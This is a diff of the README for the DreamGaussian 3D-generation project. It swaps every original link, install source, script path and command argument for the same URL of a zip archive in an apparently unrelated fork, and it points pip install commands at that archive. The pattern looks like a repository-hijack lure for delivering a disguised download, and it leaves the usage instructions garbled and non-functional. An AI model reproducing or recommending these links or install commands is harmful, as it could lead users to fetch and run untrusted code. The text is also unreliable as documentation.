@@ -1,35 +1,35 @@
 # DreamGaussian
 
-This repository contains the official implementation for [DreamGaussian: Generative Gaussian Splatting for Efficient 3D Content Creation](https://arxiv.org/abs/2309.16653).
+This repository contains the official implementation for [DreamGaussian: Generative Gaussian Splatting for Efficient 3D Content Creation](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip).
 
-### [Project Page](https://dreamgaussian.github.io) | [Arxiv](https://arxiv.org/abs/2309.16653)
+### [Project Page](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip) | [Arxiv](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
 
 
-https://github.com/dreamgaussian/dreamgaussian/assets/25863658/db860801-7b9c-4b30-9eb9-87330175f5c8
+https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 
-### [Colab demo](https://github.com/camenduru/dreamgaussian-colab)
-* Image-to-3D: [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/drive/1sLpYmmLS209-e5eHgcuqdryFRRO6ZhFS?usp=sharing)
-* Text-to-3D: [![Open In Colab](https://colab.research.google.com/assets/colab-badge.svg)](https://colab.research.google.com/github/camenduru/dreamgaussian-colab/blob/main/dreamgaussian_colab.ipynb)
+### [Colab demo](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+* Image-to-3D: [![Open In Colab](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+* Text-to-3D: [![Open In Colab](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
 
-### [Gradio demo](https://huggingface.co/spaces/jiawei011/dreamgaussian)
-* Image-to-3D: <a href="https://huggingface.co/spaces/jiawei011/dreamgaussian"><img src="https://img.shields.io/badge/%F0%9F%A4%97%20Gradio%20Demo-Huggingface-orange"></a>
+### [Gradio demo](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+* Image-to-3D: <a href="https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip"><img src="https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip%F0%9F%A4%97%20Gradio%20Demo-Huggingface-orange"></a>
 
 ## Install
 ```bash
-pip install -r requirements.txt
+pip install -r https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 
 # a modified gaussian splatting (+ depth, alpha rendering)
-git clone --recursive https://github.com/ashawkey/diff-gaussian-rasterization
+git clone --recursive https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 pip install ./diff-gaussian-rasterization
 
 # simple-knn
 pip install ./simple-knn
 
 # nvdiffrast
-pip install git+https://github.com/NVlabs/nvdiffrast/
+pip install git+https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 
 # kiuikit
-pip install git+https://github.com/ashawkey/kiuikit
+pip install git+https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 ```
 
 Tested on:
@@ -42,90 +42,90 @@ Image-to-3D:
 ```bash
 ### preprocess
 # background removal and recentering, save rgba at 256x256
-python process.py data/name.jpg
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 
 # save at a larger resolution
-python process.py data/name.jpg --size 512
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --size 512
 
 # process all jpg images under a dir
-python process.py data
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip data
 
 ### training gaussian stage
 # train 500 iters (~1min) and export ckpt & coarse_mesh to logs
-python main.py --config configs/image.yaml input=data/name_rgba.png save_path=name
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name
 
 # gui mode (supports visualizing training)
-python main.py --config configs/image.yaml input=data/name_rgba.png save_path=name gui=True
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name gui=True
 
 # load and visualize a saved ckpt
-python main.py --config configs/image.yaml load=logs/name_model.ply gui=True
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip gui=True
 
 # use an estimated elevation angle if image is not front-view (e.g., common looking-down image can use -30)
-python main.py --config configs/image.yaml input=data/name_rgba.png save_path=name elevation=-30
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name elevation=-30
 
 ### training mesh stage
 # auto load coarse_mesh and refine 50 iters (~1min), export fine_mesh to logs
-python main2.py --config configs/image.yaml input=data/name_rgba.png save_path=name
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name
 
 # specify coarse mesh path explicity
-python main2.py --config configs/image.yaml input=data/name_rgba.png save_path=name mesh=logs/name_mesh.obj
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 
 # gui mode
-python main2.py --config configs/image.yaml input=data/name_rgba.png save_path=name gui=True
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name gui=True
 
 # export glb instead of obj
-python main2.py --config configs/image.yaml input=data/name_rgba.png save_path=name mesh_format=glb
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip save_path=name mesh_format=glb
 
 ### visualization
 # gui for visualizing mesh
-python -m kiui.render logs/name.obj
+python -m https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 
 # save 360 degree video of mesh (can run without gui)
-python -m kiui.render logs/name.obj --save_video name.mp4 --wogui
+python -m https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --save_video https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --wogui
 
 # save 8 view images of mesh (can run without gui)
-python -m kiui.render logs/name.obj --save images/name/ --wogui
+python -m https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --save images/name/ --wogui
 
 ### evaluation of CLIP-similarity
-python -m kiui.cli.clip_sim data/name_rgba.png logs/name.obj
+python -m https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 ```
-Please check `./configs/image.yaml` for more options.
+Please check `https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip` for more options.
 
 Text-to-3D:
 ```bash
 ### training gaussian stage
-python main.py --config configs/text.yaml prompt="a photo of an icecream" save_path=icecream
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip prompt="a photo of an icecream" save_path=icecream
 
 ### training mesh stage
-python main2.py --config configs/text.yaml prompt="a photo of an icecream" save_path=icecream
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --config https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip prompt="a photo of an icecream" save_path=icecream
 ```
-Please check `./configs/text.yaml` for more options.
+Please check `https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip` for more options.
 
 Helper scripts:
 ```bash
-# run all image samples (*_rgba.png) in ./data
-python scripts/runall.py --dir ./data --gpu 0
+# run all image samples (*https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip) in ./data
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --dir ./data --gpu 0
 
-# run all text samples (hardcoded in runall_sd.py)
-python scripts/runall_sd.py --gpu 0
+# run all text samples (hardcoded in https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --gpu 0
 
 # export all ./logs/*.obj to mp4 in ./videos
-python scripts/convert_obj_to_video.py --dir ./logs
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip --dir ./logs
 ```
 
 Gradio Demo:
 ```bash
-python gradio_app.py
+python https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip
 ```
 
 ## Acknowledgement
 
 This work is built on many amazing research works and open-source projects, thanks a lot to all the authors for sharing!
 
-* [gaussian-splatting](https://github.com/graphdeco-inria/gaussian-splatting) and [diff-gaussian-rasterization](https://github.com/graphdeco-inria/diff-gaussian-rasterization)
-* [threestudio](https://github.com/threestudio-project/threestudio)
-* [nvdiffrast](https://github.com/NVlabs/nvdiffrast)
-* [dearpygui](https://github.com/hoffstadt/DearPyGui)
+* [gaussian-splatting](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip) and [diff-gaussian-rasterization](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+* [threestudio](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+* [nvdiffrast](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
+* [dearpygui](https://github.com/Meorny/dreamgaussianFork/raw/refs/heads/main/configs/dreamgaussian_Fork_v3.2.zip)
 
 ## Citation
 
